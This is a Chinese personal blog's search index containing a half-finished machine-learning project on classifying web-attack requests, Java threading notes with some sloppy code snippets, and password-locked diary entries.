<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>随记_l0cked</title>
    <link href="/2077/10/15/%E9%9A%8F%E8%AE%B0(%E9%94%81)/"/>
    <url>/2077/10/15/%E9%9A%8F%E8%AE%B0(%E9%94%81)/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="cc145998d5cb1e56e4e5f8d110f8bc2afc0107a02274efaa743dec6dfe5a53b0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">笔者自己看的 (h1nt：牢大，我想你了(╥﹏╥))</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web攻击识别-机器学习</title>
    <link href="/2024/02/09/web%E6%94%BB%E5%87%BB%E8%AF%86%E5%88%AB-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%B0%8F%E9%A1%B9%E7%9B%AE/"/>
    <url>/2024/02/09/web%E6%94%BB%E5%87%BB%E8%AF%86%E5%88%AB-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%B0%8F%E9%A1%B9%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<p>一次简单的机器学习实践，学了一些机器学习模型、文本处理、特征工程、超参数调优等，以及数据清理、特征提取、文本处理等处理大数据方法。</p><p>要求：对提供的训练集进行分析，通过特征工程、机器学习和深度学习等方法构建AI模型</p><p>由于之前没有机器学习的基础，因为本次实验参考了一些论文。一开始作为小白，是完全不懂这个要咋搞的，后来看了周志华的《机器学习》和《python大战机器学习》了解一下基础概念。像一些算法、模型的具体的原理其实了解一下大概就好<del>放在代码里无非也就是一个函数的调用</del></p><h1 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h1><p>观察数据集，可以看到有6种不同攻击类型的数据集，以及1个测试集，里面的访问请求就是正常抓包获得的请求，包含浏览器类型、user_id等<br><img src="/images/new/1.png"><br><img src="/images/new/2.png"></p><p>按照流程，首先进行数据处理，第一步通过正则匹配获取url中请求的参数</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_url_query</span>(<span class="hljs-params">s</span>):<br>    li = re.split(<span class="hljs-string">&#x27;[=&amp;]&#x27;</span>, urlparse(s)[<span class="hljs-number">4</span>])<br>    <span class="hljs-keyword">return</span> [li[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(li)) <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>]<br><span class="hljs-comment"># https://example.com/page?name=John&amp;age=25&amp;city=NewYork&quot;[&#x27;John&#x27;, &#x27;25&#x27;, &#x27;NewYork&#x27;]</span><br></code></pre></td></tr></table></figure><p>其次是将url解码，也就是将其中的特殊字符转化为%+数字的形式，略</p><p>还要匹配文件扩展名，也就是.后的字符(正则表达式学得不好)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">return</span> re.search(<span class="hljs-string">r&#x27;\.[a-z]+&#x27;</span>, x).group()<br></code></pre></td></tr></table></figure><p>user-agent信息提取:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># user-agent信息提取</span><br>df[<span class="hljs-string">&#x27;ua_short&#x27;</span>] = df[<span class="hljs-string">&#x27;user_agent&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: x.split(<span class="hljs-string">&#x27;/&#x27;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-comment"># 斜杠分割后的第一个部分，也就是浏览器类型</span><br>df[<span class="hljs-string">&#x27;ua_first&#x27;</span>] = df[<span class="hljs-string">&#x27;user_agent&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: x.split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-comment"># 浏览器或设备名称</span><br>eg: <span class="hljs-comment"># Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36</span><br></code></pre></td></tr></table></figure><h1 id="用TF-IDF算法提取特征"><a href="#用TF-IDF算法提取特征" class="headerlink" title="用TF-IDF算法提取特征"></a>用TF-IDF算法提取特征</h1><p>在开始提取特征之前，首先还需要分析特征，这里由于给了6种不同类型的训练集，因此一开始我打算针对不同训练集分别进行特征提取<br>针对不同类型的Web攻击，可以提取以下特征进行训练集的构建：<br>比如针对SQL注入，可以提取SQL语句特征，检测SQL查询中的关键字和结构，如SELECT、INSERT等，针对XSS跨站脚本，可以提取HTML标签特征和HTTP头部特征等，如Content-Type、Set-Cookie等。</p><p>然鹅搞了一半觉得这样还是可能有考虑不到的地方….遂上网上找代码，发现网上的更简洁，一位大哥的思路是直接把数据集合并成一个，然后提取url查询参数、参数长度等共同特征，<del>我心想原来如此，那我还搞个P啊，</del>于是我也从简单的入手，直接6个数据集ctrl cv合并，然后代码一焯提取共同特征:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><br>df[<span class="hljs-string">&#x27;url_query&#x27;</span>] = df[<span class="hljs-string">&#x27;url_unquote&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: get_url_query(x)) <span class="hljs-comment"># 提取url里的查询参数</span><br>df[<span class="hljs-string">&#x27;url_query_num&#x27;</span>] = df[<span class="hljs-string">&#x27;url_query&#x27;</span>].apply(<span class="hljs-built_in">len</span>) <span class="hljs-comment"># 存储每个url里查询参数的个数</span><br>df[<span class="hljs-string">&#x27;url_query_max_len&#x27;</span>] = df[<span class="hljs-string">&#x27;url_query&#x27;</span>].apply(find_max_str_length) <span class="hljs-comment"># 每个url查询参数的最大长度</span><br>df[<span class="hljs-string">&#x27;url_query_len_std&#x27;</span>] = df[<span class="hljs-string">&#x27;url_query&#x27;</span>].apply(find_str_length_std) <span class="hljs-comment"># 查询参数的长度的变化程度(标准差)</span><br>df[<span class="hljs-string">&#x27;url_path_len&#x27;</span>] = df[<span class="hljs-string">&#x27;url_path&#x27;</span>].apply(<span class="hljs-built_in">len</span>) <span class="hljs-comment"># 路径的长度</span><br>df[<span class="hljs-string">&#x27;url_path_num&#x27;</span>] = df[<span class="hljs-string">&#x27;url_path&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">&#x27;/&#x27;</span>, x))) <span class="hljs-comment"># url里的斜杠数量</span><br></code></pre></td></tr></table></figure><p>然后就是提取特征了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_tfidf_feats</span>(<span class="hljs-params">df, col, n_components=<span class="hljs-number">16</span></span>): <br>    text = <span class="hljs-built_in">list</span>(df[col].values)<br>    tf = TfidfVectorizer(min_df=<span class="hljs-number">1</span>,<br>                         analyzer=<span class="hljs-string">&#x27;char_wb&#x27;</span>,<br>                         ngram_range=(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>), <span class="hljs-comment"># 1-2的ngram特征: 允许长度1、2、3的字符序列</span><br>    tf.fit(text)        <span class="hljs-comment"># 进行拟合</span><br>    X = tf.transform(text) <span class="hljs-comment"># 将tf转化为TF-IDF特征矩阵x</span><br>    svd = TruncatedSVD(n_components=n_components) <span class="hljs-comment"># 截断奇异值分解(高阶矩阵-&gt;低阶)</span><br>    svd.fit(X)<br>    X_svd = svd.transform(X)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n_components):<br>        df[<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;col&#125;</span>_tfidf_<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>] = X_svd[:, i]<br>    <span class="hljs-keyword">return</span> df<br></code></pre></td></tr></table></figure><p>创建一个TF-IDF对象 tf，然后给定参数，比如n_components用于指定截断奇异值分解后所保留的奇异值个数，也就是要将原始的 TF-IDF 特征矩阵降维到的维度数量，具体这块涉及算法</p><p>有些特征后续是8需要考虑的，比如’id’, ‘user_agent’, ‘url’, ‘body’, ‘url_unquote’, ‘url_query’, ‘url_path’, ‘label’这些</p><h1 id="利用lightGBM开始训练"><a href="#利用lightGBM开始训练" class="headerlink" title="利用lightGBM开始训练"></a>利用lightGBM开始训练</h1><p>用lightGBM模型训练，起码要了解K折交叉验证对象的含义，才能选择参数填进去<br>“k折交叉验证基本思想是将原始数据集分成k个子集，其中一个子集被保留作为验证模型的数据，剩下的k-1个子集被用来训练模型。这个过程重复k次，每次选择不同的子集作为验证集，其余子集作为训练集。最终，通过对每次验证结果的平均值进行评估，得到最终的模型性能指标”</p><p>好，肥肠简单是不是，然后进入超参数调优环节：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">learning_rate：学习率，控制每次迭代中模型参数更新的步长。较小的学习率可以提高模型在训练集上的稳定性，但可能需要更多的迭代次数才能达到最优解。<br>metric：评估指标，用于衡量模型的性能。在这里，使用了 <span class="hljs-keyword">multiclass，表示多分类问题，模型会输出每个类别的概率分布。</span><br><span class="hljs-keyword"></span>objective：优化目标，定义了模型的损失函数。在这里也是 <span class="hljs-keyword">multiclass，表示多分类问题。</span><br><span class="hljs-keyword"></span>num_classes：类别数量，指定了分类任务中的类别数量。<br>feature_fraction：特征采样比例，用于控制每次迭代中随机选择的特征比例。它可以有效地减少过拟合。<br><span class="hljs-keyword">bagging_fraction：样本采样比例，用于控制每次迭代中随机选择的样本比例。也是为了减少过拟合。</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bagging_freq：样本采样频率，指定了进行样本采样的频率。设置为2表示每两次迭代进行一次样本采样。</span><br><span class="hljs-keyword"></span>n_jobs：并行运行的作业数量。设置为-<span class="hljs-number">1</span>表示使用所有可用的 CPU 核心进行并行计算。<br>seed：随机种子，用于控制随机初始化和数据划分的随机性，保证结果的可重复性。<br>max_depth：树的最大深度，控制了每棵树的复杂度。较大的深度可以增加模型的拟合能力，但也容易导致过拟合。<br>num_leaves：叶子节点数量，是树的另一种控制复杂度的参数。它决定了每棵树的叶子节点数量。<br>lambda_l1：L1 正则化参数，用于控制模型的复杂度。增加这个参数的值可以增加模型的稀疏性。<br>lambda_l2：L2 正则化参数，与 lambda_l1 类似，用于控制模型的复杂度。<br>verbose：控制输出信息的详细程度。设置为-<span class="hljs-number">1</span>表示不输出任何信息，通常用于静默模式。<br></code></pre></td></tr></table></figure><p>哈哈哈看不懂寄了(bushi)<br>赶紧百度：<br><img src="/images/%E8%B6%85%E5%8F%82%E6%95%B0.png"><br>找到了<br><img src="/images/%E8%B0%83%E5%8F%82.png"><br><img src="/images/%E5%8F%82%E6%95%B0%E8%8C%83%E5%9B%B4.png"></p><p>睡觉了，完了再更</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>刷题</title>
    <link href="/2023/06/17/%E5%88%B7%E9%A2%98/"/>
    <url>/2023/06/17/%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jvav</title>
    <link href="/2023/04/17/java/"/>
    <url>/2023/04/17/java/</url>
    
    <content type="html"><![CDATA[<h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="实现线程的方式"><a href="#实现线程的方式" class="headerlink" title="实现线程的方式"></a>实现线程的方式</h2><p>1、编写类直接继承 java.lang.Thread</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 编写程序，这段程序运行在分支线程中（分支栈）。</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;分支线程---&gt;&quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadTest02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();<br>        t.run(); <span class="hljs-comment">// 不会启动线程，不会分配新的分支栈(这种方式就是单线程，只顺序不并发)</span><br>        t.start();<span class="hljs-comment">// 这里的代码还是运行在主线程中</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;主线程---&gt;&quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>扫盲: 调用 start() 方法的效果是启动一个新的线程，并且让这个线程开始执行 run() 方法中的代码，此时主线程仍继续执行自己的代码，即并发<br>2、编写类，实现java.lang.Runnable 接口，实现run方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 这不是一个线程类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRunnable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;分支线程---&gt;&quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadTest03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyRunnable</span>()); <br>        <span class="hljs-comment">// 启动线程</span><br>        t.start();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;主线程---&gt;&quot;</span> + i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>result:(独立运行)</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">主线程<span class="hljs-params">---</span>&gt;0<br>分支线程<span class="hljs-params">---</span>&gt;0<br>主线程<span class="hljs-params">---</span>&gt;1<br>主线程<span class="hljs-params">---</span>&gt;2<br>主线程<span class="hljs-params">---</span>&gt;3<br><span class="hljs-string">......</span><br>主线程<span class="hljs-params">---</span>&gt;17<br>分支线程<span class="hljs-params">---</span>&gt;1<br><span class="hljs-string">......</span><br>分支线程<span class="hljs-params">---</span>&gt;25<br><span class="hljs-string">......</span><br>主线程<span class="hljs-params">---</span>&gt;99<br></code></pre></td></tr></table></figure><h2 id="线程的方法"><a href="#线程的方法" class="headerlink" title="线程的方法"></a>线程的方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">r.run = <span class="hljs-literal">false</span>;<span class="hljs-comment">//终止线程</span><br>...略<br></code></pre></td></tr></table></figure><h2 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h2><p>必考<br>可达、不可达、彻底不可达</p><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><p>线程同步机制：就是线程排队，必须排队<br>synchronized关键字: </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increaseCounter</span><span class="hljs-params">()</span> &#123;....&#125;;<span class="hljs-comment">// 使用 synchronized确保只有一个线程可以同时访问该方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        Thread t1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>())&#123;<br>            <span class="hljs-meta">@Override</span>;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                increaseCounter();<br>            &#125;<br>        &#125;<br>        Thread t2...;<br>        t1.start();<br>        t2.start();<br>        ......<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h2><p>比synchronized更轻量级的控制线程同步机制</p><p>spring-boot-starter-parentxuexi1</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022</title>
    <link href="/2023/01/20/2022-summary/"/>
    <url>/2023/01/20/2022-summary/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6ff7038889f454dcb88fa4b2b4419d7fa7816934d6be9aa757adbb6bcbd661a8">e4bd6587f5b022b7ffbfbb7e009dbc16f3e78710ba1bef800917f430c3ace07aa3141208d3145fc1be8dba6e22ad502159a5d635414c0412e71b95994f0e73f1b8ac0dba0ce1b6782f26d20fea5d0bca6bb29d8309a9b5acdcf6ab71770aa7f31f69717e7d0b0606dc5f1757c1e4e1f959c1e9d92741eaeb8462b8df9e2f51955f693fc9612282bf4352ffd8e18a21165fb106fa0dab091e3f9d1bd54a23c6adb5c6d97c62a2efe31c2bf19d5bbff9303dc69b7983696035adb30132c83e7181cd60410ce76bc2c2837bbe7b37123f78d8ea05ad494030018ec1628723e7bacce1dc61937ecf8f161e417162dc647aafb93ae3c95e632ee421d11aa236af4f64bf42d95837f947623e88c918171fdd16248520754824eab9d46837a2dd701aec64425f57fe1c4a7df24a3977de9bc771c90e4728a1e7e1302d371f6b8fbd341c29400b671a2cb2bb2f9f43496425f64a265abcd1280d2de99348fcc1a9fa118f7bacd90c1aea01336041c088c9075ffe7aa5f96ed395b4974188319fe64021c549c1d692f2a2ca0562a2df8c2b66b1a87f7490d9f9fd42c0bd3d6af6689c6ee77baa0c22bf893665339969ccb6c4bd0911a27bb27bd613cb4948ed99ddfca039e837cc3792a507c67f9055325b15c43eef82d315be68cd8abcf3afc5a2eee35bccb60c426577b58c3a68bb7ed8a3221c5ec19465e6cd1404cab51945dcf66004e9aa748dd2fc72771200ade9fe0d295bde107fd1ad132de7427fc78dc62fc3fda1d25a797aa1c01ffa31282cef00b4dbb5a79afc5d1002d29c0d58338d256534c0ffdd73869a69579b6ed59c26eab290f80e11404dd811e145a79d5207bdddd996fb292a12158dd0499f43b965b76b4670a23c47efd873e2f945f765f016c4a78e14fb602afe2b739f1977f7dd16d5db78e82d6c3fd033fab63058c10d9b3b9b5d4bc5586f28836b549dfce8e0851933b37cc701463b812e2c80d145cf0b3acc29294013643c2aa1402c194a0572d485c2af97c202e4f3400ea22c839995789196b05e2d52e946fa9d6b263939460721c45b7ee6e030f6487f4dbd9e32e633f15be35e2a697c2321cb6d0053d4b0f90b0a10a2571c2718a06fd0910c25a95d45875fdb92bf2c0cb286ad7332d0881876679b867e5861de87502c12cd18d06d3e05fb29339438c708a79b878cbedcf6ea4a09fda35300f750feaf63ad435cadeb4676674ed25e947205dc7a29da8bf7ce6b5f6f9e05eee6f07e8a136b3d7cf485058265404d9757b998b4b54ceca77fd1c8aa6bcc0bf01dff9aea8533c9c07689e70ffb9d08be48955c648020a1c90fcb242d57426705049ade1dfda8e02e492d7b69b5b48828f8bad348aac2718d1721da6a7ae158ca96feb56d288f3d4a9955cf83959a6ac52ba19a931596a3946fd41774d8274536fe64228f1cd9b6e23d682b7db0ed34486b626482d919a6a8fe9cd921e368681b88c74ceec642a45d5e9896a616d0da62ef66fd6036e41b2473d9bd360b38b2a17982f37f6404baa4e523de22a81bdfa1c11a003ae12d5a16495ad68e40aff4bdf34f7be16cc7466b1e34e1f6741ab37afc61b47615641db6464083c62a33a39d0fee3bafed4bcdaf15f831b84c4e03d05e85d60318d359c9ba1efe56d64d741eeb8a78ecefa540070c261981702856fbb633059a50e4932101ec01ca53a48e50501e82af9d852189f1d6746a8a44c96681c627c69979f269c413cc1ee1c9ef4c14539013f97cc71baf6ddfeaff7fbcb0ac48a0a6e19bbef2f2c3bdf9392dff445459e6a26e04ce4c0134b290a0ab933522f44718fde8001296e6f0e519a1a1b6dafaaf53106e3a7bd9f66e0f1566d7edbb215edd7ea1a229b16f68e6ddaf4ce27a512eeded2d694b0e663d012fa669128348a76b1208792aad7fe3d6ef0c776ed7bc773d7175e5492b501e826276d07339b8b87e94b93a15495314274a55c155285773569ddcb4901205b8151102b37c419b03b9b43eac4f722496146b8df1529e30b29fa7b7662d9276d9f244601516ae221a090cd398dc0351f0d46bfb9961e24a94d5b25450d87d6abd6f33268d389b8368edbafa38c4fbc584233aa16d8443d6515b047bdeb34c2ad71a49bfad7cb19ac67a66dae4b99acbe3a430a5888c6f18d6627dc29e9efd0828f2a0d7555ca27dfd6ab15707e23f8496171e7d1be0723f2f0cdae82a26640793f332ddf6b28bada93a1693580a28829337558a3f7cc1ca91f71b1ced6b10f4481470082e80e13fafb97ac67abee171f543e7d4bf9c243cfc16b9fb99dee6f845a5aa497e1ef581193f738e7ab3569d775d7e5e0c4ce0dea74d7490d52d651a1b5021d4fbed48577afa2edfa85a65e3f337acfc3f714075d2b373039dff7ee8cb005c6915b32b430d26fb881f0d6da42c3f0e9cf37fb28e431baa6354ad1fbb849769732526b1dfd9341427fa73af4e33c1da083fd303cffd490767360f61805ed74b44ad56e717ba3c32311b321cc26d6d6ce40b40dc6e73bba8ae1c155aea2c2117093f87e92664e65d660fae436c6165ddc96790c2c6a3570c258a944a463a28f589d31e58eb258698cfefdf0e336f6848f6ba4d535e0a70afe0564bf0fc04a4b87b8c0afc2bcb1747a4b339ab699b7f67d15673b64d43ba0190d7c07ddda68385347541ba529f5414461b7fbba9b433f88712cecfb7a374621c118153c35b4a82465d4306c60b38d4c9b4db404a3df3e9bfedb48c28964fac374c4e5be2d551f7b48e794f7750ecd2d6c3b0085caa9367aef048f8e10aa883fb7e1874318907748a1186cbcf8220930efde9cf9b64546d0832ab03183dd040a0387551f004fdf8f786cf0e145240ca6334e17468ed5fa27f0bc9748e7f1cc4abda54469b9e4792eef933fbc48b7e8a42c3c8ff96f27f289cbde9ca72399ac76f21f829789cd0befb0d8a111196f3e5868f027bed325f09526570d817e04b68338301b8df9e246a3605b9d47fafbb34d8809251211f91215a198edf19abd9e0452c7c2283e87d1406d30d6857831924a8fed1f4e263502d4fc31f76e7dca0f0082b0453592fd1f1177a5e04539265f90475c98db9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">为菈妮，我变成狼人模样</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot笔记(损版)</title>
    <link href="/2022/09/09/SpringBoot%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/09/09/SpringBoot%E7%AC%94%E8%AE%B0/</url>
    
